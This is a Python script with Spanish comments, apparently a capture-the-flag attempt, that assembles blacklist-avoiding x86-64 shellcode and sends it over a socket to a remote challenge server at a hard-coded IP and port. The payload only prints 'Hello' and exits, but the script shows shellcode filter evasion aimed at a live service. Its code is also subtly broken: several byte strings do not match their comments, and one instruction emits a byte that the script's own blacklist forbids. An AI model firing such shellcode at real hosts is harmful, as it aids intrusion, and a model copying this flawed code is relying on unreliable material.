#!/usr/bin/env python3

import socket

# Blacklisted: ; T b i n s h f l a g _
# Necesito evitar estos bytes completamente

# Voy a usar un shellcode que use solo instrucciones que no contengan
# los bytes prohibidos

shellcode = b""
# Voy a usar un shellcode que ejecute un comando simple
# Pero necesito evitar los bytes prohibidos

# En lugar de usar push, voy a usar mov
# En lugar de usar syscalls complejos, voy a usar algo más simple

# Voy a usar un shellcode que simplemente imprima algo
# usando write syscall directamente

shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\x50"                      # push rax (NULL terminator)

# Voy a usar un enfoque diferente - usar mov en lugar de push
# para construir la cadena

# Construir "Hello World" en el stack
shellcode += b"\x48\xc7\x04\x24\x6f\x6c\x6c\x65"  # mov qword [rsp], "ello"
shellcode += b"\x48\xc7\x44\x24\x04\x48\x65\x6c\x6c"  # mov qword [rsp+4], "Hell"

# Ahora rsp apunta a "Hello"
shellcode += b"\x48\x89\xe7"              # mov rdi, rsp (arg0: path)

# write(1, "Hello", 5)
shellcode += b"\x48\xc7\xc7\x01\x00\x00\x00"  # mov rdi, 1 (stdout)
shellcode += b"\x48\x89\xe6"              # mov rsi, rsp (buffer)
shellcode += b"\x48\xc7\xc2\x05\x00\x00\x00"  # mov rdx, 5 (count)
shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\xb0\x01"                  # mov al, 1 (write syscall)
shellcode += b"\x0f\x05"                  # syscall

# exit(0)
shellcode += b"\x48\x31\xc0"              # xor rax, rax
shellcode += b"\xb0\x3c"                  # mov al, 60 (exit syscall)
shellcode += b"\x0f\x05"                  # syscall

print("Shellcode length:", len(shellcode))
print("Shellcode bytes:", shellcode.hex())

# Check for blacklisted bytes
blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
for i, byte in enumerate(shellcode):
    if byte in blacklist:
        print(f"WARNING: Blacklisted byte {hex(byte)} found at position {i}")

# Test the connection
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("94.237.60.55", 47972))
    
    response = s.recv(1024)
    print("Received:", response.decode())
    
    s.send(shellcode)
    
    s.settimeout(10)
    try:
        while True:
            response = s.recv(1024)
            if not response:
                break
            print(response.decode(), end='')
    except socket.timeout:
        pass
    
    s.close()
    
except Exception as e:
    print(f"Error: {e}")